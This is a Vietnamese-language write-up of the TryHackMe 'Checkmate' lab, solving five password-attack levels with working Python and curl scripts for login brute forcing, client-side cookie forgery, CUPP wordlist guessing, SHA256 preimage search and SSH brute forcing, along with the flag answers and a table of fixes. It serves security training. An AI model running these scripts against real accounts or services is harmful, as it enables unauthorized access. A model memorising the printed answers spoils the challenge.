# Checkmate

| | |
|---|---|
| **Platform** | TryHackMe |
| **Link** | [https://tryhackme.com/room/checkmate](https://tryhackme.com/room/checkmate) |
| **Độ khó** | Medium |
| **Chủ đề** | Password Attacks, OSINT, Crypto |
| **Ngày** | 14/06/2026 |

---

## Mô tả

Kiểm toán mật khẩu nội bộ của Marco Bianchi — kỹ sư tại MHTLabs. 5 cấp độ leo thang từ credential mặc định đến SSH, mỗi cấp sử dụng một kỹ thuật tấn công mật khẩu khác nhau: default creds, company keyword, CUPP/OSINT, SHA256 preimage, rule-based brute force.

---

## Trinh sát

### Quét cổng

```bash
nmap -sV -Pn -p 22,5000-5003 10.48.185.17
```

| Cổng | Dịch vụ | Phiên bản |
|------|---------|-----------|
| 22/tcp | SSH | OpenSSH 9.6p1 (Ubuntu) |
| 5000/tcp | HTTP | Werkzeug 3.1.6 (Python 3.12) |
| 5001/tcp | HTTP | Werkzeug 3.1.6 (Python 3.12) |
| 5002/tcp | HTTP | Werkzeug 3.1.6 (Python 3.12) |
| 5003/tcp | HTTP | Werkzeug 3.1.6 (Python 3.12) |

### Liệt kê Web

| Cổng | Ứng dụng | Ghi chú |
|------|----------|---------|
| 5000 | Operation Checkmate Hub | Trang nộp đáp án, theo dõi tiến trình |
| 5001 | FirewallOS | Web UI quản lý firewall |
| 5002 | jobs.thm (Engineering Careers) | Trang tuyển dụng MHTLabs |
| 5003 | social.thm | Mạng xã hội nội bộ của nhân viên |

---

## Khai thác

### Level 1 — Default Credentials (FirewallOS, port 5001)

FirewallOS là web UI quản lý firewall. Không có bất kỳ dấu hiệu thay đổi cấu hình mặc định nào, thử credential mặc định nhất:

```python
import requests

r = requests.post('http://10.48.185.17:5001/login',
                  data={'username': 'admin', 'password': '12345'},
                  allow_redirects=False)
print(r.status_code)  # 302 = thành công
```

Server trả `302 Found` với cookie `fw_authed=1` → đăng nhập thành công.

**Đáp án Level 1: `12345`**

---

### Level 2 — Company Keyword Password (jobs.thm, port 5002)

Trang tuyển dụng MHTLabs liệt kê keyword doanh nghiệp ngay trong hero section:

> *"Build the future with Engineering **Innovation. Excellence. Security.** Digital transformation. Cloud-first teams."*

Marco là nhân viên MHTLabs, khả năng cao dùng keyword của công ty làm mật khẩu. Thử tuần tự các keyword (đều 10 ký tự = khớp ràng buộc Level 2):

```python
import requests

keywords = ['innovation', 'excellence', 'security', 'digital', 'talent']
for kw in keywords:
    r = requests.post('http://10.48.185.17:5002/login',
                      data={'username': 'marco', 'password': kw},
                      allow_redirects=False)
    if r.status_code == 302:
        print(f'Found: {kw}')
        break
```

**Đáp án Level 2: `excellence`**

---

### Level 3 — OSINT + CUPP (social.thm, port 5003)

#### Bước 3a — Cookie Forgery để đọc profile Marco

Login form yêu cầu tài khoản nhưng server chỉ kiểm tra cookie phía client. Forge cookie `social_authed=1`:

```bash
curl -s -b 'social_authed=1' http://10.48.185.17:5003/
```

Trang chủ trả về đầy đủ feed của Marco, lộ thông tin cá nhân từ các bài đăng:
- Họ: Bianchi
- Nickname: Marky
- Ngày sinh: 14/02/1995
- Người yêu: Oliver
- Công ty: MHTLabs

#### Bước 3b — CUPP Wordlist Generation

```bash
# Trong WSL Ubuntu
pip install cupp
cupp -i
# First Name: marco
# Surname: bianchi
# Nickname: marky
# DOB: 14021995
# Partner: oliver
# Company: MHTLabs
# (Các trường còn lại để trống)
```

CUPP sinh 3417 mật khẩu. Lọc đúng 11 ký tự (ràng buộc Level 3) còn 1132 candidates.

#### Bước 3c — Brute Force với wordlist CUPP

```python
import requests, subprocess

result = subprocess.run(
    ['wsl', '-d', 'Ubuntu', '-e', 'grep', '-E', '^.{11}$', '/tmp/cupp_repo/marco.txt'],
    capture_output=True, text=True
)
candidates = result.stdout.strip().split('\n')

for pw in candidates:
    r = requests.post('http://10.48.185.17:5003/login',
                      data={'username': 'marco', 'password': pw},
                      allow_redirects=False)
    if r.status_code == 302:
        print(f'Found: {pw}')
        break
```

**Đáp án Level 3: `Bianchi2495`** (Surname + 4 chữ số cuối DOB: 1995 → 2495 theo pattern CUPP)

---

### Level 4 — SHA256 Preimage Attack (profile picture filename)

#### Bước 4a — Thu thập hash từ URL ảnh đại diện

Truy cập profile Marco trên social.thm, ảnh đại diện được lưu tại:

```
/uploads/d34a569ab7aaa54dacd715ae64953455d86b768846cd0085ef4e9e7471489b7b.png
```

Server rename file upload: `SHA256(original_filename).png`. Nhiệm vụ là tìm `original_filename` 6 ký tự.

#### Bước 4b — Brute Force toàn bộ chuỗi 6 ký tự thường

SHA256 là hàm một chiều, không thể đảo ngược trực tiếp. Với 6 ký tự thường (a-z), không gian tìm kiếm là `26^6 = 308,915,776` (~308 triệu). Brute force trực tiếp trong ~5 phút:

```python
import hashlib, itertools, string

target = 'd34a569ab7aaa54dacd715ae64953455d86b768846cd0085ef4e9e7471489b7b'
chars = string.ascii_lowercase

for combo in itertools.product(chars, repeat=6):
    word = ''.join(combo)
    if hashlib.sha256(word.encode()).hexdigest() == target:
        print(f'Found: {word}')
        break
```

Sau khi duyệt ~57 triệu candidate, tìm được kết quả.

**Đáp án Level 4: `family`** — `SHA256("family") = d34a569ab7...`

---

### Level 5 — Rule-Based SSH Brute Force

#### Bước 5a — Thu thập pattern từ social.thm

Trong feed của Marco (đọc qua cookie forgery ở Bước 3a), có bài đăng tiết lộ công thức mật khẩu:

> *"I take a company keyword, capitalize it, then append the year like 2024 or any other number and an exclamation mark."*

Pattern: `Capitalize(keyword) + year + !`

#### Bước 5b — Xác định keyword và year phù hợp 13 ký tự

Từ jobs.thm: `innovation` (10c), `excellence` (10c), `security` (8c), `talent` (6c), `automation` (10c)...

Constraint 13 ký tự: `len(keyword) + len(year) + 1 = 13`

| Keyword | len | Year pattern | Tổng |
|---------|-----|-------------|------|
| Security | 8 | 4 chữ số (2024) | 8+4+1=13 ✓ |
| Innovation | 10 | 2 chữ số (95, 24) | 10+2+1=13 ✓ |
| Excellence | 10 | 2 chữ số (95, 24) | 10+2+1=13 ✓ |

#### Bước 5c — Brute Force SSH

```python
import paramiko

wordlist = [
    'Security2024!', 'Security2025!', 'Security2023!', 'Security1995!',
    'Innovation95!', 'Innovation24!', 'Excellence95!', 'Excellence24!',
    'Automation95!', 'Leadership95!',
]

for pw in wordlist:
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect('10.48.185.17', 22, username='marco', password=pw, timeout=5)
        print(f'Found: {pw}')
        break
    except paramiko.AuthenticationException:
        pass
```

**Đáp án Level 5: `Security2024!`** — `Security`(8) + `2024`(4) + `!`(1) = 13 ký tự

---

## Leo thang đặc quyền

Room không yêu cầu leo quyền root. Sau khi SSH vào với `marco:Security2024!`, có thể xác nhận truy cập thành công:

```bash
$ id
uid=1001(marco) gid=1001(marco) groups=1001(marco),100(users)
```

---

## Cờ

> Đây là challenge dạng credential audit — mỗi đáp án chính là "cờ" nộp lên TryHackMe.

| Level | Mô tả | Đáp án |
|-------|-------|--------|
| Level 1 | FirewallOS default password | `12345` |
| Level 2 | Employee portal keyword password | `excellence` |
| Level 3 | Social media OSINT password | `Bianchi2495` |
| Level 4 | SHA256 preimage (profile pic filename) | `family` |
| Level 5 | SSH rule-based password | `Security2024!` |

---

## Bài học

| Lỗ hổng | Gốc rễ | Fix |
|---------|--------|-----|
| Default credentials | Admin không đổi mật khẩu sau khi cài FirewallOS | Enforce change-password on first login |
| Company keyword password | Dùng keyword doanh nghiệp (excellence) làm mật khẩu | Password policy cấm dictionary words, enforce complexity |
| OSINT-derived password | Mật khẩu từ thông tin cá nhân công khai trên mạng xã hội | Không dùng thông tin cá nhân; dùng password manager |
| Predictable filename (SHA256 leakage) | Tên file gốc có thể reverse qua brute force SHA256 | Dùng UUID ngẫu nhiên thay vì hash của tên file |
| Cookie forgery | Cookie `social_authed=1` phía client không được ký → bypass auth | Dùng server-side session; không trust client cookie cho auth state |
| Rule-based SSH password | Pattern mật khẩu đăng công khai trên mạng → targeted brute force | Không tiết lộ pattern mật khẩu; dùng SSH key thay password |
